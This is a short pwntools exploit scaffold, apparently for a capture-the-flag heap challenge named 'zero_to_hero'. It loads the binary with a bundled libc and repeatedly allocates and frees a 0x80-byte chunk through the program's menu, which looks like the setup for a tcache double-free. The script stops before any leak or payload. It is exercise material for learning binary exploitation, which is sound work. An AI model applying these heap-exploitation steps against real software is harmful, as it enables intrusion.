from pwn import *
context.binary = ELF("./zero_to_hero", checksec=False)
ld = "./ld-2.29.so"
libc_path = "./libc.so.6"

def start():
    return process([ld, context.binary.path], env={"LD_PRELOAD": libc_path})

def add(p, size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(size).encode())
    p.sendafter(b"> ", data)

def remove(p, idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())

p = start()
p.sendlineafter(b"hero?\n", b"y")
add(p, 0x80, b"A"*0x80)
remove(p, 0)
add(p, 0x80, b"B"*0x80)
remove(p, 0)
p.interactive()
